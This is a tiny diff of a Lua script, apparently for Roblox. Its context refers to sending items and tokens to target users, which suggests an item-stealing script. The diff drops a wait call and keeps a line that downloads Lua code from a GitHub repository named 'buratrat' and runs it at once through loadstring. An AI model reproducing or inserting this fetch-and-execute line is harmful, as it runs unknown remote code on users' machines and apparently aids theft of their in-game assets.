@@ -568,5 +568,4 @@ if #itemsToSend > 0 or totalTokens > 0 then
     waitForTargetUsers()
 end
 
-task.wait(1)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/frierenXyz/buratrat/refs/heads/main/mainn.lua"))()
